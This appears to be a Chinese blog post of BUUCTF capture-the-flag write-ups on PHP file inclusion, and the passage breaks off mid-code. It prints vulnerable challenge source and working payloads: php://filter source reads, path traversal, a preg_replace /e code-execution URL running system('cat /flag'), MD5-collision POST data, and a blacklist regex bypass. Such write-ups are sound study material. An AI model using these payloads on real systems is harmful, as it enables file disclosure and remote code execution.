    <content type="html"><![CDATA[<h1 id="BUUCTF刷题——文件包含">BUUCTF刷题——文件包含</h1><h2 id="BSidesCTF2020-Had-a-bad-day">BSidesCTF2020 Had a bad day</h2><h3 id="考点">考点</h3><ul><li>LFI</li><li>PHP伪协议</li></ul><h3 id="解题">解题</h3><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200707180351.png" alt=""></p><p><code>index.php</code>有一个参数是woofers，测试SQL注入的是发现了include函数的报错，用PHP伪协议读取文件</p><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200707180515.png" alt=""></p><p>审计<code>index.php</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    $file = $_GET[<span class="string">&#x27;category&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($file))&#123;</span><br><span class="line">        <span class="keyword">if</span>( strpos( $file, <span class="string">&quot;woofers&quot;</span> ) !==  <span class="literal">false</span> || strpos( $file, <span class="string">&quot;meowers&quot;</span> ) !==  <span class="literal">false</span> || strpos( $file, <span class="string">&quot;index&quot;</span>))&#123;</span><br><span class="line">            <span class="keyword">include</span> ($file . <span class="string">&#x27;.php&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;Sorry, we currently only support woofers and meowers.&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>传入的<code>category</code>需要有<code>woofers</code>,<code>meowers</code>,<code>index</code>才能包含传入以传入名为文件名的文件，我们要想办法包含flag.php，直接试一下在woofers后面加<code>/../flag</code></p><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200707182200.png" alt=""></p><p>上面这个应该是非预期解，我随便试一下竟然直接出来了，这个思路可以记着。</p><p>预期解的payload的思路是利用php://filter伪协议可以套一层协议读取<code>flag.php</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">index.php?category&#x3D;php:&#x2F;&#x2F;filter&#x2F;convert.base64-encode&#x2F;index&#x2F;resource&#x3D;flag</span><br></pre></td></tr></table></figure><h2 id="极客大挑战-2019-Secret-File">极客大挑战 2019 Secret File</h2><h3 id="考点-v2">考点</h3><ul><li>信息泄露</li><li>文件包含</li></ul><h3 id="解题-v2">解题</h3><p>查看源码</p><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200507093908.png" alt=""></p><p>访问<code>Archive_room.php</code></p><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200507093947.png" alt=""></p><p>Burp抓包</p><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200507094008.png" alt=""></p><p>访问<code>secr3t.php</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">    &lt;title&gt;secret&lt;&#x2F;title&gt;</span><br><span class="line">    &lt;meta charset&#x3D;&quot;UTF-8&quot;&gt;</span><br><span class="line">&lt;?php</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">    error_reporting(0);</span><br><span class="line">    $file&#x3D;$_GET[&#39;file&#39;];</span><br><span class="line">    if(strstr($file,&quot;..&#x2F;&quot;)||stristr($file, &quot;tp&quot;)||stristr($file,&quot;input&quot;)||stristr($file,&quot;data&quot;))&#123;</span><br><span class="line">        echo &quot;Oh no!&quot;;</span><br><span class="line">        exit();</span><br><span class="line">    &#125;</span><br><span class="line">    include($file); </span><br><span class="line">&#x2F;&#x2F;flag放在了flag.php里</span><br><span class="line">?&gt;</span><br><span class="line">&lt;&#x2F;html&gt;</span><br></pre></td></tr></table></figure><p><code>include($file)</code>文件包含，而且不能用<code>input</code>、<code>data</code>等伪协议来读取文件。</p><blockquote><p><a href="https://ca0y1h.top/Web_security/basic_learning/13.%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/">文件包含漏洞利用方式</a></p></blockquote><p>payload：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?file&#x3D;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;flag.php</span><br></pre></td></tr></table></figure><h2 id="ACTF2020-新生赛-Include">ACTF2020 新生赛 Include</h2><h3 id="TODO">TODO</h3><h2 id="BJDCTF2020-ZJCTF-不过如此">BJDCTF2020 ZJCTF 不过如此</h2><h3 id="考点-v3">考点</h3><ul><li>PHP伪协议读取文件</li><li>preg_match命令执行</li></ul><h3 id="解题-v3">解题</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">$text = $_GET[<span class="string">&quot;text&quot;</span>];</span><br><span class="line">$file = $_GET[<span class="string">&quot;file&quot;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($text)&amp;&amp;(file_get_contents($text,<span class="string">&#x27;r&#x27;</span>)===<span class="string">&quot;I have a dream&quot;</span>))&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&lt;h1&gt;&quot;</span>.file_get_contents($text,<span class="string">&#x27;r&#x27;</span>).<span class="string">&quot;&lt;/h1&gt;&lt;/br&gt;&quot;</span>;</span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">&quot;/flag/&quot;</span>,$file))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;Not now!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">include</span>($file);  <span class="comment">//next.php</span></span><br><span class="line">    </span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>很明显要使用文件包含读取<code>next.php</code>，payload：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;efb75f40-dbf6-4b18-ab6e-d3e05813d2bb.node3.buuoj.cn&#x2F;?text&#x3D;php:&#x2F;&#x2F;input&amp;file&#x3D;php:&#x2F;&#x2F;filter&#x2F;convert.base64-encode&#x2F;resource&#x3D;next.php</span><br></pre></td></tr></table></figure><p>POST：<code>I have a dream</code></p><p>解码得到<code>next.php</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">$id = $_GET[<span class="string">&#x27;id&#x27;</span>]; </span><br><span class="line">$_SESSION[<span class="string">&#x27;id&#x27;</span>] = $id; </span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">complex</span>(<span class="params">$re, $str</span>) </span>&#123; </span><br><span class="line">    <span class="keyword">return</span> preg_replace( <span class="string">&#x27;/(&#x27;</span> . $re . <span class="string">&#x27;)/ei&#x27;</span>, <span class="string">&#x27;strtolower(&quot;\\1&quot;)&#x27;</span>, $str ); </span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"><span class="keyword">foreach</span>($_GET <span class="keyword">as</span> $re =&gt; $str) &#123; </span><br><span class="line">    <span class="keyword">echo</span> complex($re, $str). <span class="string">&quot;\n&quot;</span>; </span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getFlag</span>(<span class="params"></span>)</span>&#123; </span><br><span class="line">    @<span class="keyword">eval</span>($_GET[<span class="string">&#x27;cmd&#x27;</span>]); </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里涉及到<code>preg_replace()</code>函数的命令执行，附上分析文章：<a href="https://xz.aliyun.com/t/2557">https://xz.aliyun.com/t/2557</a></p><p>payload：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;efb75f40-dbf6-4b18-ab6e-d3e05813d2bb.node3.buuoj.cn&#x2F;next.php?\S*&#x3D;$&#123;getFlag()&#125;&amp;cmd&#x3D;system(%27cat%20&#x2F;flag%27);</span><br></pre></td></tr></table></figure><blockquote><p>执行system函数后面要加分号。</p></blockquote><h2 id="安洵杯2019-easyweb">安洵杯2019 easyweb</h2><h3 id="考点-v4">考点</h3><ul><li>文件包含</li></ul><h3 id="解题-v4">解题</h3><p>进入题目之后观察url：<code>http://4e78d6a5-8227-41e7-95d5-6b01336c4a5c.node3.buuoj.cn/index.php?img=TXpVek5UTTFNbVUzTURabE5qYz0&amp;cmd=</code>，img的参数比较可疑，用base64解码一次得到<code>MzUzNTM1MmU3MDZlNjc=</code>，感觉又要base64解码一次得到<code>3535352e706e67</code>，这个就比较像16进制了，转码后发现是<code>555.png</code>，很明显的文件包含，写一个python脚本生成<code>index.php</code>的参数。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"></span><br><span class="line">filename=<span class="string">&#x27;index.php&#x27;</span>.encode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">hex = binascii.b2a_hex(filename)</span><br><span class="line">encode_str = base64.encode(base64.encode(hex))</span><br><span class="line">print(encode_str)</span><br></pre></td></tr></table></figure><p>得到<code>index.php</code>的源码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(E_ALL || ~ E_NOTICE);</span><br><span class="line">header(<span class="string">&#x27;content-type:text/html;charset=utf-8&#x27;</span>);</span><br><span class="line">$cmd = $_GET[<span class="string">&#x27;cmd&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">isset</span>($_GET[<span class="string">&#x27;img&#x27;</span>]) || !<span class="keyword">isset</span>($_GET[<span class="string">&#x27;cmd&#x27;</span>])) </span><br><span class="line">    header(<span class="string">&#x27;Refresh:0;url=./index.php?img=TXpVek5UTTFNbVUzTURabE5qYz0&amp;cmd=&#x27;</span>);</span><br><span class="line">$file = hex2bin(base64_decode(base64_decode($_GET[<span class="string">&#x27;img&#x27;</span>])));</span><br><span class="line"></span><br><span class="line">$file = preg_replace(<span class="string">&quot;/[^a-zA-Z0-9.]+/&quot;</span>, <span class="string">&quot;&quot;</span>, $file);</span><br><span class="line"><span class="keyword">if</span> (preg_match(<span class="string">&quot;/flag/i&quot;</span>, $file)) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;&lt;img src =&quot;./ctf3.jpeg&quot;&gt;&#x27;</span>;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;xixi～ no flag&quot;</span>);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    $txt = base64_encode(file_get_contents($file));</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;img src=&#x27;data:image/gif;base64,&quot;</span> . $txt . <span class="string">&quot;&#x27;&gt;&lt;/img&gt;&quot;</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> $cmd;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">if</span> (preg_match(<span class="string">&quot;/ls|bash|tac|nl|more|less|head|wget|tail|vi|cat|od|grep|sed|bzmore|bzless|pcre|paste|diff|file|echo|sh|\&#x27;|\&quot;|\`|;|,|\*|\?|\\|\\\\|\n|\t|\r|\xA0|\&#123;|\&#125;|\(|\)|\&amp;[^\d]|@|\||\\$|\[|\]|&#123;|&#125;|\(|\)|-|&lt;|&gt;/i&quot;</span>, $cmd)) &#123;</span><br><span class="line">    <span class="keyword">echo</span>(<span class="string">&quot;forbid ~&quot;</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> ((<span class="keyword">string</span>)$_POST[<span class="string">&#x27;a&#x27;</span>] !== (<span class="keyword">string</span>)$_POST[<span class="string">&#x27;b&#x27;</span>] &amp;&amp; md5($_POST[<span class="string">&#x27;a&#x27;</span>]) === md5($_POST[<span class="string">&#x27;b&#x27;</span>])) &#123;</span><br><span class="line">        <span class="keyword">echo</span> `$cmd`;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">echo</span> (<span class="string">&quot;md5 is funny ~&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>第一步md5碰撞，和我之前在这篇文章BJDCTF2020 Easy MD5记录的一样，POST数据：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a&#x3D;1%0A%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00+%F7%B9%9D%AB%97o%3F%E9%85%14%1E%A9%88%86%EDm%02Sj%B1%85%92%5E%07%8E%82Z%97%BC%AD%10%22%C6%CB%D8%CC%8CG%E2%EB%FF%C89%3E%D6%D1mE%AAL4%E1%F2d%CD%E1%073c%04%DA6%1C%BFj%8B%C9%08U%17%22%9D%F3%C5ne%FA%A5%2B%A9%F7%8F_D%E22%D0%AD%B5+%CF%06%60%A8%C7%D3%FB%12T%AF%C2%914%B4B%0A%5C%2C%3C%F9%99P%ED%B0%8E%E4%C7%A8%C2%F6%D0%A6%90%BC%B5%2F%ED&amp;b&#x3D;1%0A%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00+%F7%B9%9D%AB%97o%3F%E9%85%14%1E%A9%88%86%EDm%02S%EA%B1%85%92%5E%07%8E%82Z%97%BC%AD%10%22%C6%CB%D8%CC%8CG%E2%EB%FF%C89%3EV%D2mE%AAL4%E1%F2d%CD%E1%073%E3%04%DA6%1C%BFj%8B%C9%08U%17%22%9D%F3%C5ne%FA%A5%2B%A9%F7%8F%DFD%E22%D0%AD%B5+%CF%06%60%A8%C7%D3%FB%12T%AF%C2%914%B4B%0A%5C%2C%BC%F8%99P%ED%B0%8E%E4%C7%A8%C2%F6%D0%A6%10%BC%B5%2F%ED</span><br></pre></td></tr></table></figure><p>第二步就是绕过这个正则表达式，需要FUZZ Linux命令去执行读取文件，这里提供两个命令：<code>sort</code>和<code>strings</code>。</p><p>另外，过滤反斜杠 <code>|\\|\\\\|</code>的这两个正则没有写好，导致了反斜杠的逃逸，直接用<code>ca\t</code>命令。</p><blockquote><p>关于这个反斜杠逃逸我是真的没太看懂。。。</p></blockquote><h2 id="BJDCTF2nd-文件探测">BJDCTF2nd 文件探测</h2><h3 id="考点-v5">考点</h3><ul><li>文件包含</li><li>SSRF</li><li>格式化字符串漏洞</li><li>Session绕过</li></ul><h3 id="解题-v5">解题</h3><p>查看HTTP返回头发现有一个Hint：<code>home.php</code>，访问后观察url</p><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200712115335.png" alt=""></p><p>file参数是一个文件名，用php伪协议尝试文件包含</p><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200712115431.png" alt=""></p><p><code>home.php</code>文件</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">setcookie(<span class="string">&quot;y1ng&quot;</span>, sha1(md5(<span class="string">&#x27;y1ng&#x27;</span>)), time() + <span class="number">3600</span>);</span><br><span class="line">setcookie(<span class="string">&#x27;your_ip_address&#x27;</span>, md5($_SERVER[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>]), time()+<span class="number">3600</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">&#x27;file&#x27;</span>]))&#123;</span><br><span class="line">    <span class="keyword">if</span> (preg_match(<span class="string">&quot;/\^|\~|&amp;|\|/&quot;</span>, $_GET[<span class="string">&#x27;file&#x27;</span>])) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;forbidden&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">&quot;/.?f.?l.?a.?g.?/i&quot;</span>, $_GET[<span class="string">&#x27;file&#x27;</span>]))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;not now!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">&quot;/.?a.?d.?m.?i.?n.?/i&quot;</span>, $_GET[<span class="string">&#x27;file&#x27;</span>]))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;You! are! not! my! admin!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">&quot;/^home$/i&quot;</span>, $_GET[<span class="string">&#x27;file&#x27;</span>]))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;禁止套娃&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(preg_match(<span class="string">&quot;/home$/i&quot;</span>, $_GET[<span class="string">&#x27;file&#x27;</span>]) <span class="keyword">or</span> preg_match(<span class="string">&quot;/system$/i&quot;</span>, $_GET[<span class="string">&#x27;file&#x27;</span>]))&#123;</span><br><span class="line">            $file = $_GET[<span class="string">&#x27;file&#x27;</span>].<span class="string">&quot;.php&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            $file = $_GET[<span class="string">&#x27;file&#x27;</span>].<span class="string">&quot;.fxxkyou!&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;现在访问的是 &quot;</span>.$file . <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">        <span class="keyword">require</span> $file;</span><br><span class="line">    &#125;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;script&gt;location.href=&#x27;./home.php?file=system&#x27;&lt;/script&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>同样的方式可以读取<code>system.php</code>文件</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">error_reporting(0);</span><br><span class="line">if (!isset($_COOKIE[&#39;y1ng&#39;]) || $_COOKIE[&#39;y1ng&#39;] !&#x3D;&#x3D; sha1(md5(&#39;y1ng&#39;)))&#123;</span><br><span class="line">    echo &quot;&lt;script&gt;alert(&#39;why you are here!&#39;);alert(&#39;fxck your scanner&#39;);alert(&#39;fxck you! get out!&#39;);&lt;&#x2F;script&gt;&quot;;</span><br><span class="line">    header(&quot;Refresh:0.1;url&#x3D;index.php&quot;);</span><br><span class="line">    die;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$str2 &#x3D; &#39;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;Error:&amp;nbsp;&amp;nbsp;url invalid&lt;br&gt;~$ &#39;;</span><br><span class="line">$str3 &#x3D; &#39;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;Error:&amp;nbsp;&amp;nbsp;damn hacker!&lt;br&gt;~$ &#39;;</span><br><span class="line">$str4 &#x3D; &#39;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;Error:&amp;nbsp;&amp;nbsp;request method error&lt;br&gt;~$ &#39;;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br><span class="line">&lt;!DOCTYPE html PUBLIC &quot;-&#x2F;&#x2F;W3C&#x2F;&#x2F;DTD XHTML 1.0 Transitional&#x2F;&#x2F;EN&quot; &quot;http:&#x2F;&#x2F;www.w3.org&#x2F;TR&#x2F;xhtml1&#x2F;DTD&#x2F;xhtml1-transitional.dtd&quot;&gt;</span><br><span class="line">&lt;html xmlns&#x3D;&quot;http:&#x2F;&#x2F;www.w3.org&#x2F;1999&#x2F;xhtml&quot;&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;meta http-equiv&#x3D;&quot;Content-Type&quot; content&#x3D;&quot;text&#x2F;html; charset&#x3D;utf-8&quot; &#x2F;&gt;</span><br><span class="line">    &lt;meta http-equiv&#x3D;&quot;X-UA-Compatible&quot; content&#x3D;&quot;IE&#x3D;edge&quot;&gt;</span><br><span class="line">    &lt;meta name&#x3D;&quot;viewport&quot; content&#x3D;&quot;width&#x3D;device-width, initial-scale&#x3D;1&quot;&gt;</span><br><span class="line">    &lt;title&gt;File Detector&lt;&#x2F;title&gt;</span><br><span class="line"></span><br><span class="line">    &lt;link rel&#x3D;&quot;stylesheet&quot; type&#x3D;&quot;text&#x2F;css&quot; href&#x3D;&quot;css&#x2F;normalize.css&quot; &#x2F;&gt;</span><br><span class="line">    &lt;link rel&#x3D;&quot;stylesheet&quot; type&#x3D;&quot;text&#x2F;css&quot; href&#x3D;&quot;css&#x2F;demo.css&quot; &#x2F;&gt;</span><br><span class="line"></span><br><span class="line">    &lt;link rel&#x3D;&quot;stylesheet&quot; type&#x3D;&quot;text&#x2F;css&quot; href&#x3D;&quot;css&#x2F;component.css&quot; &#x2F;&gt;</span><br><span class="line"></span><br><span class="line">    &lt;script src&#x3D;&quot;js&#x2F;modernizr.custom.js&quot;&gt;&lt;&#x2F;script&gt;</span><br><span class="line"></span><br><span class="line">&lt;&#x2F;head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;section&gt;</span><br><span class="line">    &lt;form id&#x3D;&quot;theForm&quot; class&#x3D;&quot;simform&quot; autocomplete&#x3D;&quot;off&quot; action&#x3D;&quot;system.php&quot; method&#x3D;&quot;post&quot;&gt;</span><br><span class="line">        &lt;div class&#x3D;&quot;simform-inner&quot;&gt;</span><br><span class="line">            &lt;span&gt;&lt;p&gt;&lt;center&gt;File Detector&lt;&#x2F;center&gt;&lt;&#x2F;p&gt;&lt;&#x2F;span&gt;</span><br><span class="line">            &lt;ol class&#x3D;&quot;questions&quot;&gt;</span><br><span class="line">                &lt;li&gt;</span><br><span class="line">                    &lt;span&gt;&lt;label for&#x3D;&quot;q1&quot;&gt;你知道目录下都有什么文件吗?&lt;&#x2F;label&gt;&lt;&#x2F;span&gt;</span><br><span class="line">                    &lt;input id&#x3D;&quot;q1&quot; name&#x3D;&quot;q1&quot; type&#x3D;&quot;text&quot;&#x2F;&gt;</span><br><span class="line">                &lt;&#x2F;li&gt;</span><br><span class="line">                &lt;li&gt;</span><br><span class="line">                    &lt;span&gt;&lt;label for&#x3D;&quot;q2&quot;&gt;请输入你想检测文件内容长度的url&lt;&#x2F;label&gt;&lt;&#x2F;span&gt;</span><br><span class="line">                    &lt;input id&#x3D;&quot;q2&quot; 